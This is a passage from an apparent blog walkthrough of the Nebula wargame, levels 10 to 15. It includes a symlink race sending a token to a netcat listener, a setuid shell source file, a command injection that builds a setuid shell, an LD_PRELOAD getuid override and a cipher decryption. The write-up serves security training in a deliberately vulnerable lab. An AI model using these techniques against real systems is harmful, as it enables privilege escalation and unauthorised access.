<span style=color:#75715e># the counties symlink swap is now happening between /var/tmp/shell.c which I can read and /home/flag10/token which I cant.</span>

level10@nebula:/home/flag10$ <span style=color:#66d9ef>while</span> true; <span style=color:#66d9ef>do</span> ./flag10 /var/tmp/flag10-token 192.168.217.1; <span style=color:#66d9ef>done</span>
You don<span style=color:#e6db74>&#39;t have access to /var/tmp/flag10-token
</span><span style=color:#e6db74>You don&#39;</span>t have access to /var/tmp/flag10-token
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
</code></pre></div><p>On my netcat listener I now had:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>~ » nc -lk <span style=color:#ae81ff>18211</span>
.oO Oo.
<span style=color:#75715e>#include&lt;stdio.h&gt;</span>

int main<span style=color:#f92672>(</span>void<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    setresuid<span style=color:#f92672>(</span>geteuid<span style=color:#f92672>()</span>, geteuid<span style=color:#f92672>()</span>, geteuid<span style=color:#f92672>())</span>;
    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span><span style=color:#f92672>)</span>;
    <span style=color:#66d9ef>return</span> 0;
<span style=color:#f92672>}</span>

.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
</code></pre></div><p>With the token file read, we end the level:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level10@nebula:/home/flag10$ su - flag10
Password:
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level11>level11<a hidden class=anchor aria-hidden=true href=#level11>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level11/>Level11&rsquo;s Description</a>:</p>
<blockquote>
<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>
</blockquote>
<p>With the description we are provided with the source code of a small PHP program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/mman.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#75715e>/*
</span><span style=color:#75715e> * Return a random, non predictable file, and return the file descriptor for it.
</span><span style=color:#75715e> */</span>

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getrand</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>path)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>tmp;
  <span style=color:#66d9ef>int</span> pid;
  <span style=color:#66d9ef>int</span> fd;

  srandom(time(NULL));

  tmp <span style=color:#f92672>=</span> getenv(<span style=color:#e6db74>&#34;TEMP&#34;</span>);
  pid <span style=color:#f92672>=</span> getpid();

  asprintf(path, <span style=color:#e6db74>&#34;%s/%d.%c%c%c%c%c%c&#34;</span>, tmp, pid,
      <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>), <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>),
      <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>), <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>),
      <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>), <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>));

  fd <span style=color:#f92672>=</span> open(<span style=color:#f92672>*</span>path, O_CREAT<span style=color:#f92672>|</span>O_RDWR, <span style=color:#ae81ff>0600</span>);
  unlink(<span style=color:#f92672>*</span>path);
  <span style=color:#66d9ef>return</span> fd;
}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>process</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buffer, <span style=color:#66d9ef>int</span> length)
{
  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> key;
  <span style=color:#66d9ef>int</span> i;

  key <span style=color:#f92672>=</span> length <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>;

  <span style=color:#66d9ef>for</span>(i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> length; i<span style=color:#f92672>++</span>) {
      buffer[i] <span style=color:#f92672>^=</span> key;
      key <span style=color:#f92672>-=</span> buffer[i];
  }

  system(buffer);
}

<span style=color:#75715e>#define CL &#34;Content-Length: &#34;
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
{
  <span style=color:#66d9ef>char</span> line[<span style=color:#ae81ff>256</span>];
  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>1024</span>];
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>mem;
  <span style=color:#66d9ef>int</span> length;
  <span style=color:#66d9ef>int</span> fd;
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>path;

  <span style=color:#66d9ef>if</span>(fgets(line, <span style=color:#66d9ef>sizeof</span>(line), stdin) <span style=color:#f92672>==</span> NULL) {
      errx(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;reading from stdin&#34;</span>);
  }

  <span style=color:#66d9ef>if</span>(strncmp(line, CL, strlen(CL)) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
      errx(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;invalid header&#34;</span>);
  }

  length <span style=color:#f92672>=</span> atoi(line <span style=color:#f92672>+</span> strlen(CL));

  <span style=color:#66d9ef>if</span>(length <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>sizeof</span>(buf)) {
      <span style=color:#66d9ef>if</span>(fread(buf, length, <span style=color:#ae81ff>1</span>, stdin) <span style=color:#f92672>!=</span> length) {
          err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;fread length&#34;</span>);
      }
      process(buf, length);
  } <span style=color:#66d9ef>else</span> {
      <span style=color:#66d9ef>int</span> blue <span style=color:#f92672>=</span> length;
      <span style=color:#66d9ef>int</span> pink;

      fd <span style=color:#f92672>=</span> getrand(<span style=color:#f92672>&amp;</span>path);

      <span style=color:#66d9ef>while</span>(blue <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
          printf(<span style=color:#e6db74>&#34;blue = %d, length = %d, &#34;</span>, blue, length);

          pink <span style=color:#f92672>=</span> fread(buf, <span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>sizeof</span>(buf), stdin);
          printf(<span style=color:#e6db74>&#34;pink = %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, pink);

          <span style=color:#66d9ef>if</span>(pink <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>) {
              err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;fread fail(blue = %d, length = %d)&#34;</span>, blue, length);
          }
          write(fd, buf, pink);

          blue <span style=color:#f92672>-=</span> pink;
      }

      mem <span style=color:#f92672>=</span> mmap(NULL, length, PROT_READ<span style=color:#f92672>|</span>PROT_WRITE, MAP_PRIVATE, fd, <span style=color:#ae81ff>0</span>);
      <span style=color:#66d9ef>if</span>(mem <span style=color:#f92672>==</span> MAP_FAILED) {
          err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;mmap&#34;</span>);
      }
      process(mem, length);
  }

}
</code></pre></div><p>I&rsquo;ll admit. This level kicked my ass. Eventually I gave up and resorted to a few hints that could tell me how to proceed. None of the other walkthroughs that I read actually had working exploits for this level either. That which I have tried never got me to even execute <code>getflag</code> so that it would be happy with the effective user ids. Maybe this level is bugged, but I am not sure :(</p>
<h2 id=level12>level12<a hidden class=anchor aria-hidden=true href=#level12>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level12/>Level12&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a backdoor process listening on port 50001.</p>
</blockquote>
<p>With the description we are provided with the source code of a small Lua program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=color:#66d9ef>local</span> socket <span style=color:#f92672>=</span> require(<span style=color:#e6db74>&#34;socket&#34;</span>)
<span style=color:#66d9ef>local</span> server <span style=color:#f92672>=</span> assert(socket.bind(<span style=color:#e6db74>&#34;127.0.0.1&#34;</span>, <span style=color:#ae81ff>50001</span>))

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>hash</span>(password)
  prog <span style=color:#f92672>=</span> io.popen(<span style=color:#e6db74>&#34;echo &#34;</span><span style=color:#f92672>..</span>password<span style=color:#f92672>..</span><span style=color:#e6db74>&#34; | sha1sum&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>)
  data <span style=color:#f92672>=</span> prog:read(<span style=color:#e6db74>&#34;*all&#34;</span>)
  prog:close()

  data <span style=color:#f92672>=</span> string.sub(data, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>40</span>)

  <span style=color:#66d9ef>return</span> data
<span style=color:#66d9ef>end</span>


<span style=color:#66d9ef>while</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>do</span>
  <span style=color:#66d9ef>local</span> client <span style=color:#f92672>=</span> server:accept()
  client:send(<span style=color:#e6db74>&#34;Password: &#34;</span>)
  client:settimeout(<span style=color:#ae81ff>60</span>)
  <span style=color:#66d9ef>local</span> line, err <span style=color:#f92672>=</span> client:receive()
  <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> err <span style=color:#66d9ef>then</span>
      print(<span style=color:#e6db74>&#34;trying &#34;</span> <span style=color:#f92672>..</span> line) <span style=color:#75715e>-- log from where ;\</span>
      <span style=color:#66d9ef>local</span> h <span style=color:#f92672>=</span> hash(line)

      <span style=color:#66d9ef>if</span> h <span style=color:#f92672>~=</span> <span style=color:#e6db74>&#34;4754a4f4bd5787accd33de887b9250a0691dd198&#34;</span> <span style=color:#66d9ef>then</span>
          client:send(<span style=color:#e6db74>&#34;Better luck next time</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      <span style=color:#66d9ef>else</span>
          client:send(<span style=color:#e6db74>&#34;Congrats, your token is 413**CARRIER LOST**</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
      <span style=color:#66d9ef>end</span>

  <span style=color:#66d9ef>end</span>

  client:close()
<span style=color:#66d9ef>end</span>
</code></pre></div><p>This level had another very obvious command injection vulnerability on the line where a <code>password</code> variable is piped through <code>sha1sum</code>. I made a copy of this program and modified it to print me the outputs so that I could prepare a properly formatted command to be used on a socket. The basic idea of the injection was to separate the echo with a <code>;</code> character and compile my setuid C shell. I then added a hash (#) to ignore the rest of the command what would have been executed.</p>
<p>So, to solve level12:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level12@nebula:~$ echo <span style=color:#e6db74>&#34;;gcc /var/tmp/shell.c -o /var/tmp/flag12;chmod 4777 /var/tmp/flag12;#&#34;</span> | nc 127.0.0.1 <span style=color:#ae81ff>50001</span>
Password: Better luck next time

level12@nebula:~$ /var/tmp/flag12
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$
</code></pre></div><h2 id=level13>level13<a hidden class=anchor aria-hidden=true href=#level13>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level13/>Level13&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=color:#f92672>#</span>include <span style=color:#f92672>&lt;</span>stdlib.h<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>#</span>include <span style=color:#f92672>&lt;</span>unistd.h<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>#</span>include <span style=color:#f92672>&lt;</span>stdio.h<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>#</span>include <span style=color:#f92672>&lt;</span>sys<span style=color:#f92672>/</span>types.h<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>#</span>include <span style=color:#f92672>&lt;</span>string.h<span style=color:#f92672>&gt;</span>

<span style=color:#f92672>#</span>define FAKEUID <span style=color:#ae81ff>1000</span>

int main(int argc, char <span style=color:#f92672>**</span>argv, char <span style=color:#f92672>**</span>envp)
{
  int c;
  char token[<span style=color:#ae81ff>256</span>];

  <span style=color:#66d9ef>if</span>(getuid() <span style=color:#960050;background-color:#1e0010>!</span><span style=color:#f92672>=</span> FAKEUID) {
      printf(<span style=color:#e6db74>&#34;Security failure detected. UID %d started us, we expect %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, getuid(), FAKEUID);
      printf(<span style=color:#e6db74>&#34;The system administrators will be notified of this violation</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      exit(EXIT_FAILURE);
  }

  <span style=color:#f92672>//</span> snip, sorry :)

  printf(<span style=color:#e6db74>&#34;your token is %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, token);

}
</code></pre></div><p>This level had me researching for quite some time. I came to learn of ELF DSO&rsquo;s and <code>LD_PRELOAD</code>. Basically, it is possible to have the dynamic linker preload shared libraries from the <code>LD_PRELOAD</code> environment variable that may allow for some functions to be modified. <a href=https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/>This</a> article contained most of the magic that was needed to get this level done.</p>
<p>I decided to &lsquo;override&rsquo; the <code>getuid()</code> function so that it would return the value of the <code>FAKEUID</code> constant in the program, instead of the value the real <code>getuid()</code> would have returned. For that to happen, I looked up the arguments for <code>getuid()</code> from the man page and copied that for my own purposes. I then compiled it as a shared library with the famous <code>-shared -fPIC</code> arguments for position independent code and exported the <code>LD_PRELOAD</code> variable prior to running the binary.</p>
<p>One important thing to note here is that this &lsquo;hack&rsquo; has a few gotchas. The executing binary and the library needs to be relative to each other. SETUID programs discard the <code>LD_PRELOAD</code> environment variable (for obvious reasons) so this is not a privilege escalation. In the source code we have received, there is a portion excluded (that probably just prints the token :P) on purpose. This means we can copy the binary and still be able to get the desired effect. Of course, we could also resort to slapping this into a debugger and checking what it is doing under the hood, but given the nature of Nebula, I figured the point is to actually override <code>getuid()</code>.</p>
<p>So, to solve level13:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level13@nebula:/var/tmp$ cp ~flag13/flag13 .

level13@nebula:/var/tmp$ cat fake_getuid.c
<span style=color:#75715e>#include&lt;unistd.h&gt;</span>

uid_t getuid<span style=color:#f92672>(</span>void<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    <span style=color:#66d9ef>return</span> 1000;
<span style=color:#f92672>}</span>

level13@nebula:/var/tmp$ gcc -shared -fPIC /var/tmp/fake_getuid.c -o /var/tmp/fake_getuid.o

level13@nebula:/var/tmp$ LD_PRELOAD<span style=color:#f92672>=</span>/var/tmp/fake_getuid.o ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58

level13@nebula:/var/tmp$ su - flag13
Password:
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level14>level14<a hidden class=anchor aria-hidden=true href=#level14>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level14/>Level14&rsquo;s Description</a>:</p>
<blockquote>
<p>This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</p>
</blockquote>
<p>Logged in as user <code>level14</code>, we see 2 files in the <code>flag14</code> directory:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level14@nebula:~$ cd ~flag14
level14@nebula:/home/flag14$ ls -lh
total 8.0K
-rwsr-x--- <span style=color:#ae81ff>1</span> flag14  level14 7.2K 2011-12-05 18:59 flag14
-rw------- <span style=color:#ae81ff>1</span> level14 level14   <span style=color:#ae81ff>37</span> 2011-12-05 18:59 token

level14@nebula:/home/flag14$ cat token
857:g67?5ABBo:BtDA?tIvLDKL<span style=color:#f92672>{</span>MQPSRQWW.
</code></pre></div><p><code>token</code> obviously being the target to decrypt. Running <code>flag14</code> tells us that it is expecting a <code>-e</code> flag to encrypt. So, I tested the encryption to see how it behaves:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level14@nebula:/home/flag14$ ./flag14 -e
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ABCDEFGHIJKLMNOPQRSTUVWXYZ<span style=color:#f92672>[</span><span style=color:#ae81ff>\]</span>^<span style=color:#f92672>(</span>
</code></pre></div><p>What immediately jumped out at me was the A&rsquo;s that I had sent it came back as the alphabet. :D After a few tests I came to the conclusion that the key seems to start at 0, and increments with every character. Each characters ASCII value is then incremented by what ever the current value of the key is. To test this theory, I wrote a small python script to replicate this behavior:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>

<span style=color:#75715e># exploit-exercises level14 cryptor</span>

string <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;AABBCCDDEEFFGG&#39;</span>
key <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>

print <span style=color:#e6db74>&#39;String: </span><span style=color:#e6db74>{s}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Strlen: </span><span style=color:#e6db74>{l}</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format(s <span style=color:#f92672>=</span> string, l <span style=color:#f92672>=</span> len(string))

<span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> string:
    print <span style=color:#e6db74>&#39;Key: </span><span style=color:#e6db74>{key}</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74> Char: </span><span style=color:#e6db74>{char}</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74> Ord: </span><span style=color:#e6db74>{ord}</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74> Res: </span><span style=color:#e6db74>{res}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format(
        key <span style=color:#f92672>=</span> key, char <span style=color:#f92672>=</span> char, ord <span style=color:#f92672>=</span> ord(char), res <span style=color:#f92672>=</span> chr(ord(char) <span style=color:#f92672>+</span> key)
    )
    result <span style=color:#f92672>+=</span> chr(ord(char) <span style=color:#f92672>+</span> key)
    key <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>

print <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Result: </span><span style=color:#e6db74>{res}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format(res <span style=color:#f92672>=</span> result)
</code></pre></div><p>Running this meant that the output would be:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>~ # python crypt.py
String: AABBCCDDEEFFGG
Strlen: 14
Key: 0   Char: A     Ord: 65     Res: A
Key: 1   Char: A     Ord: 65     Res: B
Key: 2   Char: B     Ord: 66     Res: D
Key: 3   Char: B     Ord: 66     Res: E
Key: 4   Char: C     Ord: 67     Res: G
Key: 5   Char: C     Ord: 67     Res: H
Key: 6   Char: D     Ord: 68     Res: J
Key: 7   Char: D     Ord: 68     Res: K
Key: 8   Char: E     Ord: 69     Res: M
Key: 9   Char: E     Ord: 69     Res: N
Key: 10  Char: F     Ord: 70     Res: P
Key: 11  Char: F     Ord: 70     Res: Q
Key: 12  Char: G     Ord: 71     Res: S
Key: 13  Char: G     Ord: 71     Res: T

Result: ABDEGHJKMNPQST
</code></pre></div><p>The same string was checked using the <code>flag14</code> cryptor:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level14@nebula:/home/flag14$ ./flag14 -e
AABBCCDDEEFFGG
ABDEGHJKMNPQST
</code></pre></div><p>A match :) Being able to replicate the encryption, meant that the decryption was trivial. Instead of adding 1 to the key, I simply subtracted 1 from the key in order to reverse the string in the <code>token</code> file:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>~ # python decrypt.py
String: 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
Strlen: 36  Key start = 0
Key: 0   Char: 8     Ord: 56     Res: 8
Key: 1   Char: 5     Ord: 53     Res: 4
Key: 2   Char: 7     Ord: 55     Res: 5
Key: 3   Char: :     Ord: 58     Res: 7
Key: 4   Char: g     Ord: 103    Res: c
Key: 5   Char: 6     Ord: 54     Res: 1
Key: 6   Char: 7     Ord: 55     Res: 1
Key: 7   Char: ?     Ord: 63     Res: 8
Key: 8   Char: 5     Ord: 53     Res: -
Key: 9   Char: A     Ord: 65     Res: 8
Key: 10  Char: B     Ord: 66     Res: 8
Key: 11  Char: B     Ord: 66     Res: 7
Key: 12  Char: o     Ord: 111    Res: c
Key: 13  Char: :     Ord: 58     Res: -
Key: 14  Char: B     Ord: 66     Res: 4
Key: 15  Char: t     Ord: 116    Res: e
Key: 16  Char: D     Ord: 68     Res: 4
Key: 17  Char: A     Ord: 65     Res: 0
Key: 18  Char: ?     Ord: 63     Res: -
Key: 19  Char: t     Ord: 116    Res: a
Key: 20  Char: I     Ord: 73     Res: 5
Key: 21  Char: v     Ord: 118    Res: a
Key: 22  Char: L     Ord: 76     Res: 6
Key: 23  Char: D     Ord: 68     Res: -
Key: 24  Char: K     Ord: 75     Res: 3
Key: 25  Char: L     Ord: 76     Res: 3
Key: 26  Char: {     Ord: 123    Res: a
Key: 27  Char: M     Ord: 77     Res: 2
Key: 28  Char: Q     Ord: 81     Res: 5
Key: 29  Char: P     Ord: 80     Res: 3
Key: 30  Char: S     Ord: 83     Res: 5
Key: 31  Char: R     Ord: 82     Res: 3
Key: 32  Char: Q     Ord: 81     Res: 1
Key: 33  Char: W     Ord: 87     Res: 6
Key: 34  Char: W     Ord: 87     Res: 5
Key: 35  Char: .     Ord: 46     Res:


Result: 8457c118-887c-4e40-a5a6-33a25353165
</code></pre></div><p>So, to solve level14:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level14@nebula:/home/flag14$ su - flag14
Password:
flag14@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level15>level15<a hidden class=anchor aria-hidden=true href=#level15>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level15/>Level15&rsquo;s Description</a>:</p>
<blockquote>
<p>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
Clean up after yourself :)</p>
</blockquote>
<p>Logged in as user <code>level15</code>, we see 1 file in the <code>flag15</code> directory called <code>flag15</code>. Running it simply tells us to <em>strace it!</em>. Running it with <code>strace</code> immediately reveals a whole bunch of interesting things about <code>flag15</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>level15@nebula:/home/flag15$ strace ./flag15
execve(&#34;./flag15&#34;, [&#34;./flag15&#34;], [/* 20 vars */]) = 0
brk(0)                                  = 0x88c9000
access(&#34;/etc/ld.so.nohwcap&#34;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786b000
access(&#34;/etc/ld.so.preload&#34;, R_OK)      = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/i686/sse2/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/i686/sse2/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/i686/sse2&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/i686/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/i686/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/i686/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/i686&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/sse2/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/sse2/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/sse2&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/tls/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/tls&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/i686/sse2/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/i686/sse2/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/i686/sse2&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/i686/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/i686/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/i686/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/i686&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/sse2/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/sse2/cmov&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/sse2/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&#34;/var/tmp/flag15/sse2&#34;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&#34;/var/tmp/flag15/cmov/libc.so.6&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
